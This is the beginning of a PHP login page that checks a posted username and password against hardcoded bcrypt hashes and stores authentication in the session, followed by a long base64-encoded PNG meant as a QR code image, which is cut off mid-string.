<?php
session_start();

// Hashed username and password
$stored_username_hash = '$2b$12$e0xCwm6TdWNi/2lWkVXynuDPjWxfOXeQ.G13Vg/8.Stki0gVfmCFy';
$stored_password_hash = '$2b$12$tAuRGj/g.uB4EOBm3QDBpeC54FhLmmHgPNC/4wiHqg1czxE0TTj/K';

function isAuthenticated() {
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Authenticate user
    if (password_verify($username, $stored_username_hash) && password_verify($password, $stored_password_hash)) {
        $_SESSION['authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Invalid username or password.";
    }
}

// Base64 encoded QR code image (example, replace with your actual Base64 QR code)
$qr_code_base64 = 'data:image/png;base64,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x49PS0tLvHbevHk333xzlwUGg8FFixYpnWsXwDSIe0gS8Xj8yiuvrK6uHjRoUOf+u9vtTklJyc7OLi4unj59+v79+19++eW77767uLh48eLFiQtyevTocfalnD179sQDAyB5kKZLVj3fvd188MEHyjY8iLvqqqu++OKLLjvrF7/4RXFx8enTpy+4W9vb2w8ePPjbZSkGAAAcsklEQVSTn/xk5syZJ06c6KblunXrBCZpUMSq+e6TwK233mr13jMkNzdXynbAqVrQTkpKSl5e3rp163r27Dlnzpxjx45ZXRGAGRD3kDxIT93yeDxPPvlkSkrKf/zHfzQ1NamsC8AWEPegrxEjRvz2t7/dsWPH+++/f84GbrcbY/eQNHCqFpLNmTNnDh8+/Omnn3700UdfffVVnz59xo4dO3Xq1IKCgv79+3dpfMkll5SWlq5cufL06dMvv/xyl/976NAhgQdtA9gT4h6SyokTJ9avXx8Khf7yl790voByyJAh11577a9//esuc2dedNFFs2fPXr9+/b//+7/v3bvXipIBTILBHHCe843Rt7e3/+d//ucDDzzw5z//ucvF8sePH9+wYcM111xz5MiRLq8aNmzYTTfdhKyHpIe4B+c5X9zv2rWrsrLy9OnT53vh0aNHH3jggW+//bbzH91u90033cQ/BwOAQyHuIUm43e7vv//+gtfYbNmyZfv27V3+6PF4qI/EAnAcxD04D7tnpMsfOS+haWxs3Lx5c5c/pqSkXHXVVfIKBLAjxD0kiR49eD/M5xymHzFihOyKAOwFcQ/Oc86x+549eS8z++67787+4+DBgw3XBWBriHtwnlOnTnV0dHT5I//DC9k8OV3+mJ2dLak6AJtC3IPzHD9+/OxTstOnT+eczqyxsbGxsbHLH0ePHn32TVgAyQRxD85TX19/9rxmY8aMueaaay742t69e58+fXr37t1d/p6Tk+P1eqWWCWAviHtwnh9++OG9997r8seLLrpoxYoVifnrz8ntdt9yyy3XXnvtiy++2GU8JyMj4/bbbx84cKCakgFsQMo0yrLccccdSld23rx5Vq+i2YqLi0mbqLKy8pzLUbZPBA0dOrS+vr5LkadOnVq3bt3QoUPP+ZJevXrNnTu3trb2hRdeGDFixNGjR89++eOPP27bc7aYrE3Yxo0blX3D4vF4fO3atUrrx3z3oLW6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